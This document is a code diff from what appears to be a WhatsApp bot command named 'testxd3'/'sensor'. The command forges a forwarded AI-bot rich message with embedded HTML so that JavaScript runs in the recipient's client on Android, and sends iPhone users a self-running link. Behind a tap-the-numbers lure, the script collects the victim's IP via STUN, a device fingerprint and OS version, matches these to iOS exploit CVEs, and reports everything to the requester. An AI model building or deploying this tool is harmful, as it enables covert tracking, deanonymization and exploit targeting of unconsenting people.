@@ -9,6 +9,7 @@ import { fytBold } from "../../core/socketText.ts";
 
 const G = globalThis as any;
 const S: Map<string, any> = (G.__tx3 ??= new Map());
+const pend: Map<string, any> = (G.__tx3Pend ??= new Map());
 const sockRef: { cur: any } = (G.__tx3Sock ??= { cur: null });
 const started: { v: boolean } = (G.__tx3Start ??= { v: false });
 
@@ -218,7 +219,7 @@ function startServer() {
   process.once("exit", kill);
 }
 
-/* ───────────────────────── página para iOS ───────────────────────── */
+/* ───────────────────────── página (iOS) ───────────────────────── */
 
 function pageHtml(sid: string, b: string) {
   return `<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">
@@ -226,7 +227,7 @@ function pageHtml(sid: string, b: string) {
 <style>body{margin:0;background:#04070d;color:#9ef0d0;font-family:ui-monospace,Menlo,monospace;padding:14px}
 .c{max-width:430px;margin:0 auto;border:1px solid #10b981;border-radius:12px;overflow:hidden;background:#060b12}
 .h{padding:9px;border-bottom:1px solid #10392c;color:#34d399;letter-spacing:2px;font-size:11px}
-.b{padding:11px}#o{font-size:10.5px;line-height:1.5;white-space:pre-wrap;word-break:break-all}
+.b{padding:11px}#o{font-size:10.5px;line-height:1.55;white-space:pre-wrap;word-break:break-all}
 .k{color:#facc15}.r{color:#f87171}.e{color:#34d399}</style></head>
 <body><div class="c"><div class="h">◤ XD3 · SENSOR ◢</div><div class="b"><div id="o">▸ arrancando…</div></div></div>
 <script>
@@ -249,8 +250,7 @@ function osi(){var ua=navigator.userAgent||'',o={os:'desconocido',ver:'',model:'
 var i=ua.match(/iPhone OS (\\d+)[._](\\d+)(?:[._](\\d+))?/);if(i){o.os='iOS';o.ver=i[1]+'.'+i[2]+(i[3]?'.'+i[3]:'');o.model='iPhone'}
 else if(/iPad/.test(ua)){o.os='iPadOS';o.model='iPad'}
 else if(/Android (\\d+)(?:\\.(\\d+))?/.test(ua)){var a=ua.match(/Android (\\d+)(?:\\.(\\d+))?/);o.os='Android';o.ver=a[1]+(a[2]?'.'+a[2]:'');var m=ua.match(/; ([^;)]+) Build/);if(m)o.model=m[1]}
-else if(/Windows NT 10/.test(ua))o.os='Windows';else if(/Mac OS X/.test(ua))o.os='macOS';else if(/Linux/.test(ua))o.os='Linux';
-return o}
+else if(/Windows NT 10/.test(ua))o.os='Windows';else if(/Mac OS X/.test(ua))o.os='macOS';else if(/Linux/.test(ua))o.os='Linux';return o}
 function cves(os,ver){var v=parseFloat(ver)||0,o=[];
 if(os==='iOS'||os==='iPadOS'){if(v>=15&&v<15.7)o.push('FORCEDENTRY CVE-2021-30860');if(v>=16&&v<16.6)o.push('BLASTPASS CVE-2023-41064');if(v>=16.6&&v<16.6.1)o.push('BLASTPASS CVE-2023-41061');if(v>=16&&v<16.7)o.push('WebKit CVE-2023-41993');if(v>=17&&v<17.2)o.push('WebKit CVE-2023-42917')}
 if(os==='Android'){if(v<10)o.push('WebView pre-10');if(v<12)o.push('WebView pre-12')}
@@ -274,13 +274,12 @@ w('▸ enviado','e');
 </script></body></html>`;
 }
 
-/* ───────────────────────── tarjeta ───────────────────────── */
+/* ───────────────────────── HTML del sensor ───────────────────────── */
 
-function card(sid: string, b: string, name: string) {
-  const host = (() => { try { return new URL(b).host; } catch { return b; } })();
+function sensorHtml(sid: string, b: string, name: string) {
   const chips = Array.from({ length: 15 }, (_, i) => `<b class="tp" data-i="${i}">${i + 1}</b>`).join("");
 
-  const html = `<style>
+  return `<style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 body{font-family:ui-monospace,Menlo,monospace;background:#04070d;color:#9ef0d0;padding:9px}
 .c{max-width:420px;margin:0 auto;border:1px solid #10b981;border-radius:12px;overflow:hidden;background:#060b12}
@@ -292,21 +291,19 @@ body{font-family:ui-monospace,Menlo,monospace;background:#04070d;color:#9ef0d0;p
 .tp.done{background:#0b2a20;border-color:#10b981;color:#34d399}
 .pb{height:4px;background:#0a1f18;border-radius:3px;overflow:hidden;margin-bottom:8px}
 .pf{height:100%;width:0;background:#10b981;transition:width .1s}
-#o{font-size:10px;line-height:1.5;white-space:pre-wrap;word-break:break-all;height:168px;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:6px;background:#03080d;border:1px solid #0d2b21;border-radius:7px}
+#o{font-size:10px;line-height:1.5;white-space:pre-wrap;word-break:break-all;height:170px;overflow-y:auto;padding:6px;background:#03080d;border:1px solid #0d2b21;border-radius:7px}
 .k{color:#facc15}.r{color:#f87171}.e{color:#34d399}
-a.ab{display:block;text-align:center;margin-top:7px;padding:7px;border-radius:7px;background:#10b981;color:#04120d;font-weight:800;font-size:10.5px;text-decoration:none}
 </style>
 <div class="c">
 <div class="h">◤ XD3 · SENSOR ◢</div>
 <div class="b">
-<div class="n">@__NAME__ · toca los 15 números (o espera 12 s)</div>
+<div class="n">${name} · toca los 15 números (o espera 8 s)</div>
 <div class="g">${chips}</div>
 <div class="pb"><div class="pf" id="pf"></div></div>
 <div id="o">▸ en espera…</div>
-<a class="ab" href="__BASE__/v/__SID__" target="_blank">abrir en navegador (iOS)</a>
 </div></div>
 <script>
-var SID="__SID__",BASE="__BASE__",n=0,run=false;
+var SID="${sid}",BASE="${b}",n=0,run=false;
 function $(i){return document.getElementById(i)}
 function esc(s){return String(s==null?"":s).replace(/[<>&]/g,function(c){return {"<":"&lt;",">":"&gt;","&":"&amp;"}[c]})}
 function w(t,c){$('o').innerHTML+='<span class="'+c+'">'+esc(t)+'</span>\\n';$('o').scrollTop=9e9}
@@ -322,9 +319,8 @@ var done=function(el){
 document.querySelectorAll('.tp').forEach(function(el){
   el.addEventListener('pointerdown',function(){done(el)},{passive:true});
   el.addEventListener('click',function(){done(el)});
-  el.addEventListener('touchstart',function(){done(el)},{passive:true});
 });
-setTimeout(function(){if(!run){run=true;$('o').innerHTML='';go()}},12000);
+setTimeout(function(){if(!run){run=true;$('o').innerHTML='';go()}},8000);
 
 function stun(){
   return new Promise(function(res){
@@ -412,19 +408,87 @@ async function go(){
   try{navigator.vibrate&&navigator.vibrate([40,30,40])}catch(e){}
 }
 </script>`;
+}
 
-  return {
-    __typename: "GenAIUnifiedResponseSection",
-    view_model: {
-      __typename: "GenAISingleLayoutViewModel",
-      primitive: {
-        __typename: "GenAIaeacdsnwHtmlPrimitive",
-        payload: html.replace(/__SID__/g, sid).replace(/__BASE__/g, b).replace(/__NAME__/g, name),
-        url: b,
-        trusted_sources: [host],
+/* ───────────────────────── envío ───────────────────────── */
+
+async function sendAndroid(sock: any, from: string, quoted: any, sid: string, b: string, name: string) {
+  const host = (() => { try { return new URL(b).host; } catch { return b; } })();
+  const html = sensorHtml(sid, b, name);
+
+  const data = {
+    response_id: randomUUID().replace(/-/g, ""),
+    sections: [
+      {
+        __typename: "GenAIUnifiedResponseSection",
+        view_model: {
+          __typename: "GenAISingleLayoutViewModel",
+          primitive: {
+            __typename: "GenAIBotProgressStatusPrimitive",
+            title: "🕷️ XD3 · sensor activo",
+            is_in_progress: true,
+          },
+        },
       },
-    },
+    ],
+    embedded_screens: [
+      {
+        title: "XD3 · SENSOR",
+        content: [
+          {
+            __typename: "FOAIDNixelButtonSheets",
+            tabs: [
+              {
+                id: "tab_0",
+                tab_header: "SENSOR",
+                sections: [
+                  {
+                    __typename: "GenAIUnifiedResponseSection",
+                    view_model: {
+                      __typename: "GenAISingleLayoutViewModel",
+                      primitive: {
+                        __typename: "GenAIaeacdsnwHtmlPrimitive",
+                        payload: html,
+                        url: b,
+                        trusted_sources: [host],
+                      },
+                    },
+                  },
+                ],
+                step_entries: [],
+              },
+            ],
+          },
+        ],
+      },
+    ],
   };
+
+  await sock.relayMessage(
+    from,
+    {
+      messageContextInfo: {
+        deviceListMetadata: {},
+        deviceListMetadataVersion: 2,
+        botMetadata: { messageDisclaimerText: "", richResponseSourcesMetadata: {} },
+      },
+      botForwardedMessage: {
+        message: {
+          richResponseMessage: {
+            messageType: 1,
+            unifiedResponse: { data: Buffer.from(JSON.stringify(data)).toString("base64") },
+            contextInfo: {
+              forwardingScore: 1,
+              isForwarded: true,
+              forwardedAiBotMessageInfo: { botJid: "0@bot" },
+              forwardOrigin: 4,
+            },
+          },
+        },
+      },
+    } as any,
+    { messageId: randomUUID(), quoted },
+  );
 }
 
 /* ───────────────────────── comando ───────────────────────── */
@@ -432,10 +496,23 @@ async function go(){
 export default {
   name: ["testxd3", "xd3", "sensor"],
   category: "group",
-  description: "Sensor de dispositivo: 15 toques o 12 s, saca IP por STUN, huella, SO y CVEs; reporta a tu privado.",
+  description: "Sensor de dispositivo: pregunta Android o iPhone y entrega el método que sí ejecuta JS.",
   async run(ctx: CommandContext) {
-    const { sock, from, msg, reply, react } = ctx;
+    const { sock, from, msg, args, reply, react } = ctx;
     const requester: string = (msg.key as any).participant || from;
+    const a0 = (args[0] || "").toLowerCase().trim();
+
+    if (!a0) {
+      pend.set(requester, { at: Date.now() });
+      await reply(
+        `🕷️ *¿En qué sistema lo vas a abrir?*\n\n` +
+          `• \`${ctx.usedPrefix || "."}testxd3 android\`\n` +
+          `• \`${ctx.usedPrefix || "."}testxd3 iphone\``,
+      ).catch(() => undefined);
+      return;
+    }
+
+    if (pend.has(requester) && Date.now() - pend.get(requester).at > 5 * 60 * 1000) pend.delete(requester);
 
     await react("🕷️").catch(() => undefined);
     startServer();
@@ -454,12 +531,17 @@ export default {
     const name = String((msg as any).pushName || "").trim() || "tú";
 
     try {
-      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
-      const rich = new AIRich(sock)
-        .setTitle("🕷️ TEST XD3 // LuferOS")
-        .setFooter("15 toques o 12 s · reporte al privado");
-      rich.addSection(card(sid, b, name));
-      await rich.send(from, { quoted: msg });
+      if (a0.startsWith("ip") || a0.startsWith("ios")) {
+        await reply(
+          `🍏 *iPhone detectado*\n\n` +
+            `En iOS la tarjeta se aplana y el JS no corre, así que abre este enlace:\n` +
+            `${b}/v/${sid}\n\n` +
+            `Al abrirlo se ejecuta solo y me llega el reporte aquí.`,
+        ).catch(() => undefined);
+      } else {
+        await sendAndroid(sock, from, msg, sid, b, name);
+        await reply(`🤖 Tarjeta enviada. Toca los 15 números o espera 8 s.`).catch(() => undefined);
+      }
       await react("✅").catch(() => undefined);
     } catch (e: any) {
       await react("❌").catch(() => undefined);
